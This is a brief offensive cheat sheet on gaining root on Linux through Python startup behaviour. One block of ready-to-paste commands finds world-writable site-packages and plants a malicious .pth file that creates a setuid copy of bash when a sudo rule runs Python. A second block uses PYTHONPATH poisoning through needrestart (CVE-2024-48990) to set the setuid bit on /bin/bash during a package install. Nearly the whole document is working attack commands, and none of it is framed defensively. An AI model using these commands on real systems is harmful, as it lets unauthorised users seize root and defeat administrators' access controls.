# Python .pth Path Config Code Exec

Python processes all `.pth` files in `site-packages` at interpreter startup. A line beginning with `import ` is executed as code (not treated as a path). If any `site-packages` directory is world-writable, plant a `.pth` file to run code whenever Python starts — including via a sudo rule.

```bash
# Find writable site-packages
python3 -c "import site; print(site.getsitepackages())"
find /usr/lib/python3* /usr/local/lib/python3* -name "site-packages" -writable 2>/dev/null

# Drop malicious .pth file (name must end in .pth)
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' \
  > /usr/local/lib/python3.X/dist-packages/evil.pth

# Trigger: next time sudo calls any python3 script, code runs as root
sudo /path/to/script.py
/tmp/rootbash -p
```

Works when:
- The sudo rule runs `python3` or any Python script
- `sudo` preserves `PYTHONPATH` (or is bypassed via site-packages write)
- `sudo` with `env_reset` still runs Python, which reads site-packages at start

Alternative: `PYTHONPATH` poisoning (CVE-2024-48990, needrestart) — if needrestart runs after package installs, it spawns Python with the upgrader's environment, including any `PYTHONPATH` the attacker set:
```bash
export PYTHONPATH=/tmp/evil
mkdir -p /tmp/evil
echo 'import os; os.system("chmod +s /bin/bash")' > /tmp/evil/needrestart_module.py
sudo apt install <any-package>
/bin/bash -p
```
